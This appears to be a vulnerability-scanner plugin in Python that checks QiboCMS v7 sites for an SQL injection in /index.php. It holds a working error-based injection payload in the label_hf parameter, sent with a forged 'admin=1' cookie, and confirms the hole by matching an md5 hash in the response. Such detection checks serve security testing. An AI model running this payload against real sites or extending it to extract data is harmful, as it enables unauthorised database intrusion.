#!/usr/bin/env python   
# -*- coding:utf-8 -*-
#_Function_ = 齐博CMS v7整站系统 /index.php SQL注入漏洞

import re
  
def assign(service, arg):  
    if service == "qibocms":   
        return True, arg  
  
def audit(arg):  
    payload = '/index.php?jobs=show&label_hf[1%27%20and%20extractvalue(1,concat(0x5c,md5(3.1415)))%23][2]=asd'
    cookie = 'admin=1'
    target = arg + payload
    code, head, res, errcode, final_url = curl.curl('-b %s %s' % (cookie,target))  
    if code == 200:  
        m = re.search('63e1f04640e83605c1d177544a5a0488', res)  
        if m:  
            security_hole('QiboCMS index.php SQL Injection')  
  
  
if __name__ == '__main__':  
    from dummy import *  
    audit(assign('qibocms', 'http://www.example.com/')[1])